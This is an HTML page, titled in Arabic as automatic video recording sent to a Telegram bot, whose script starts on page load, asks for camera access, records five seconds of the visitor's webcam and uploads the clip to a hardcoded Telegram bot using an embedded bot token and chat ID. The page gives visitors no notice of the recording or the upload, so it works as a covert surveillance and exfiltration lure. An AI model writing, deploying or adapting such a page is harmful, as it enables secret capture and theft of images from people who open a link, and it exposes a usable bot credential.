<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل فيديو تلقائي وإرساله إلى بوت تيليجرام</title>
  <style>
    body {
      margin: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    video {
      width: 100%;
      max-width: 400px;
      border: 2px solid #00ff99;
      border-radius: 12px;
    }
  </style>
</head>
<body>
  <video id="video" autoplay muted playsinline></video>

  <script>
    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
    const CHAT_ID = '6036900535';

    const video = document.getElementById('video');

    async function startRecording() {
      try {
        // طلب إذن الكاميرا بدون صوت
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        // إعداد المسجل
        const recorder = new MediaRecorder(stream);
        let chunks = [];

        recorder.ondataavailable = (e) => {
          chunks.push(e.data);
        };

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('video', blob, 'recorded.webm');

          try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
              method: 'POST',
              body: formData
            });

            if (res.ok) {
              console.log("✅ تم إرسال الفيديو بنجاح");
            } else {
              console.error("❌ فشل إرسال الفيديو");
            }
          } catch (error) {
            console.error("📶 خطأ في الاتصال:", error);
          }
        };

        // بدء التسجيل تلقائيًا
        recorder.start();

        // مدة التسجيل (مثلاً 5 ثوانٍ)
        setTimeout(() => {
          recorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 5000);

      } catch (err) {
        console.error("🚫 فشل الوصول إلى الكاميرا:", err);
      }
    }

    // ابدأ بعد تحميل الصفحة
    window.onload = startRecording;
  </script>
</body>
</html>
